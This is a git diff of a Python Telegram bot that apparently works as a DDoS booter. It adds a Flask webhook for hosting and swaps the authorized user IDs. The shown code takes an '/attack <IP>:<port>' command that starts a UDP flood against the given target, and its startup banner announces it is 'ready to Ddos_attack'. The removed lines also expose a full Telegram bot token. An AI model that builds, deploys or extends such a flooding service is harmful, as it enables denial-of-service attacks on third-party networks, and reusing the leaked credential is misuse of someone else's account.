@@ -9,6 +9,7 @@ import sys
 import datetime
 import logging
 import socket
+from flask import Flask, request
 
 # 🎛️ Function to install required packages
 def install_requirements():
@@ -38,11 +39,13 @@ def install_requirements():
 install_requirements()
 
 # 🎛️ Telegram API token (replace with your actual token)
-TOKEN = '7119517186:AAGkpy6jd4_06kwIw7kzoF393iz-PLeFjLo'
+TOKEN = os.getenv("TOKEN")
+WEBHOOK_URL = "https://" + os.getenv("SPACE_HOST")
 bot = telebot.TeleBot(TOKEN, threaded=False)
+app = Flask(__name__)
 
 # 🛡️ List of authorized user IDs (replace with actual IDs)
-AUTHORIZED_USERS = [6034827272, 709106377]
+AUTHORIZED_USERS = [5283370687]
 
 # 🌐 Global dictionary to keep track of user attacks
 user_attacks = {}
@@ -106,6 +109,16 @@ def get_uptime():
 def log_command(user_id, command):
     logging.info(f"User ID {user_id} executed command: {command}")
 
+@app.route('/', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = telebot.types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return '', 200
+    else:
+        return 'Invalid content type', 403
+
 # 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -153,29 +166,7 @@ def attack(message):
         start_udp_flood(user_id, target_ip, target_port)
     except (IndexError, ValueError):
         bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")
-        
-"""""
-    Me             scammer 🏳️‍🌈
- ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
-⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
-⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
-⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
-⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
-⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
-⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
-⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
-⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
-
-‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
-"""""
 # 💬 Command handler for /stop
 @bot.message_handler(commands=['stop'])
 def stop(message):
@@ -336,12 +327,14 @@ if __name__ == "__main__":
     print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
     print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
 
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        logging.error(f"Bot encountered an error: {e}")
-        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
-        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-        print(" 🔁 Restarting the Telegram bot... 🔄")
-        print(" 💻 Bot is now restarting. Please wait... ⏳")
+    def set_webhook():
+        webhook_set = bot.set_webhook(url=WEBHOOK_URL)
+        if webhook_set:
+            print(f"Webhook set to {WEBHOOK_URL}")
+        else:
+            print("Failed to set webhook")
+    
+    if __name__ == "__main__":
+        set_webhook()
+        app.run(host='0.0.0.0', port=7860)
         
